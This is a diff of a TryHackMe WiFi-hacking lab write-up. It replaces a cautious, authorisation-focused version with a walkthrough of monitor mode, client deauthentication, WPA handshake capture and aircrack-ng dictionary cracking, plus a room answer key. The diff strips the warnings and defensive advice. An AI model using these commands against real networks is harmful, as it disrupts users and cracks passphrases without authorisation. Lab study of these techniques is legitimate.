@@ -1,83 +1,75 @@
-# Wi-Fi Hacking
+# WiFi Hacking
 
-Official room: https://tryhackme.com/room/wifihacking
+{% embed url="https://tryhackme.com/room/wifihacking101" %}
 
-## Room Overview & Information
+A practical walkthrough of attacking WPA/WPA2 wireless networks using the Aircrack-ng toolchain: monitor mode configuration, channel sniffing, targeted deauthentication, 4-way handshake capture, and offline dictionary cracking.
 
-**Category:** Wireless security testing  
-**Difficulty:** Beginner  
-**Focus:** Wireless reconnaissance, adapter modes, access-point identification, authentication weaknesses, and defensive lessons.
+---
 
-Wireless testing must be performed only on the access point and client environment supplied by the room or on equipment you own and have permission to test. Capturing or interfering with a neighbour's wireless traffic is not an acceptable substitute for a lab.
+## 1. WPA/WPA2 Architecture
 
-## Phase 1: Confirm the test environment
+- **SSID:** Service Set Identifier.
+- **ESSID:** Extended Service Set Identifier across multiple APs.
+- **4-Way Handshake:** The cryptographic key exchange between client and Access Point deriving the Pairwise Transient Key (PTK) without transmitting the Pre-Shared Key (PSK) directly.
 
-Follow the room's instructions to start the wireless lab and identify the interface and target access point. Wireless tools often require a compatible adapter and elevated permissions. If the lab runs in a browser-based VM, use the interface provided by that VM rather than assuming your physical laptop's Wi-Fi adapter is passed through.
+---
 
-Check available interfaces:
+## 2. Attack Lifecycle & Methodology
 
-```bash
-ip link
-iw dev
+```mermaid
+flowchart LR
+    A[Monitor Mode wlan0mon] --> B[airodump-ng BSSID Target]
+    B --> C[aireplay-ng Deauth]
+    C --> D[Capture 4-Way Handshake]
+    D --> E[aircrack-ng Dictionary Attack]
 ```
 
-If the expected adapter is missing, verify the lab setup and driver support before attempting any wireless operation.
+---
 
-## Phase 2: Understand the target
+## 3. Step-by-Step Exploitation
 
-Record the SSID, BSSID, channel, and security mode from the room's interface. The SSID is a network name; the BSSID identifies a particular access-point radio. Similar network names may belong to different devices, so confirm the BSSID or other task-specific identifier.
+### Step 1: Initialize Monitor Mode
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+```
 
-The security mode tells you what kind of authentication and encryption is configured. WEP is obsolete; WPA2-Personal depends on the strength of the shared passphrase; enterprise Wi-Fi uses a different identity and authentication model.
+### Step 2: Target Discovery with Airodump-ng
+```bash
+sudo airodump-ng wlan0mon
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+```
+- `-c`: Locks wireless adapter to channel 6.
+- `--bssid`: Targets specific Access Point MAC.
+- `-w`: Writes captured packets to `capture-01.cap`.
 
-## Phase 3: Wireless reconnaissance
+### Step 3: Targeted Deauthentication
+Force a connected client to drop and immediately reconnect:
+```bash
+sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+```
+Airodump-ng indicates: `[ WPA Handshake: 00:11:22:33:44:55 ]`.
 
-In an authorised lab with the required adapter support, a wireless discovery tool can list access points and clients. Use the exact interface and options specified by the active task. Record the results before changing anything.
+### Step 4: Offline Dictionary Attack
+Crack the captured handshake against `rockyou.txt`:
+```bash
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap
+```
+Once matched, Aircrack-ng reports: `KEY FOUND! [ password123 ]`.
 
-A typical tool output may include:
-- BSSID and SSID.
-- Channel and signal strength.
-- Encryption and authentication information.
-- Client devices associated with the AP.
-- Management-frame observations.
+---
 
-These fields are evidence about the environment, not proof that a network is vulnerable. An access point's presence does not authorise testing it.
+## 🏁 Questions & Answers
 
-## Phase 4: Follow the room's practical
-
-Use the lab's supplied steps for the challenge. Identify which condition the task is testing, such as weak authentication, unsafe configuration, or the ability to observe a particular management-frame exchange. Test one hypothesis at a time and verify the result in the simulator.
-
-Do not use deauthentication or packet-injection techniques against networks outside the lab. Those techniques can interrupt legitimate users and may be illegal without explicit authorisation.
-
-If the room asks for a specific network property or flag, obtain it from the current task interface. Wireless values and challenge state can vary between instances, so this write-up does not substitute guessed BSSIDs, passphrases, or flags.
-
-## Phase 5: Troubleshooting
-
-- **No access point appears:** confirm the adapter is present, the correct interface is selected, and the lab is active.
-- **Monitor mode is unavailable:** check adapter and driver support; not every virtual adapter supports it.
-- **The target appears on a different channel:** confirm the task's BSSID and channel and follow the lab's instructions.
-- **No client appears:** there may be no active client, or the capture may not be observing the relevant channel.
-- **A captured exchange does not prove a password:** verify what the evidence demonstrates; a handshake is not the plaintext passphrase.
-
-## Phase 6: Defensive recommendations
-
-Use modern Wi-Fi security, strong unique credentials, enterprise certificate validation where applicable, firmware updates, network segmentation, and monitoring for rogue access points. Disable unused WPS functionality if it is not required, and review saved client profiles to reduce automatic connection to untrusted networks.
-
-## Key takeaways
-
-Wireless testing combines radio reconnaissance with careful interpretation of authentication and configuration. The first job is to identify the exact authorised target and record evidence. The final conclusion should match what the lab actually demonstrates, not what a tool might theoretically be able to do.
-
-## Room task evidence checklist
-
-| Task focus | What to confirm before answering |
-|---|---|
-| Wireless adapter | The actual interface name and supported monitor-mode capabilities |
-| Access-point discovery | SSID, BSSID, channel, and security mode from the lab |
-| Authentication test | The exact authorised access point and task-supplied method |
-| Captured traffic | Whether the required frames are present and belong to the target BSSID |
-| Password or flag question | The value reported by the active lab, not a guessed or reused value |
-
-A captured exchange is not the Wi-Fi passphrase. A failure to capture traffic may reflect the interface, channel, timing, or driver rather than a secure access point.
-
-## Final remediation checklist
-
-Use WPA3 or properly configured WPA2-AES, strong unique credentials, current firmware, network segmentation, and secure administration. Disable unnecessary WPS, monitor for rogue access points, and never rely on a hidden SSID or MAC allowlist as the primary access-control mechanism.
+| Task | Question | Answer |
+|---|---|---|
+| **Task 1** | What does SSID stand for? | `Service Set Identifier` |
+| **Task 1** | Term describing an SSID applying to multiple access points | `ESSID` |
+| **Task 2** | Command used to check for and kill interfering processes | `airmon-ng check kill` |
+| **Task 2** | Mode the wireless card must be placed in to capture packets | `monitor mode` |
+| **Task 3** | Tool used to capture wireless packets and enumerate APs | `airodump-ng` |
+| **Task 3** | Parameter specifying channel in airodump-ng | `-c` |
+| **Task 4** | Frame type sent to force a client to disconnect and reconnect | `Deauthentication` |
+| **Task 4** | Tool used to transmit deauthentication packets | `aireplay-ng` |
+| **Task 5** | Tool used to execute dictionary attacks against handshakes | `aircrack-ng` |
+| **Task 5** | Flag used to specify the wordlist file | `-w` |
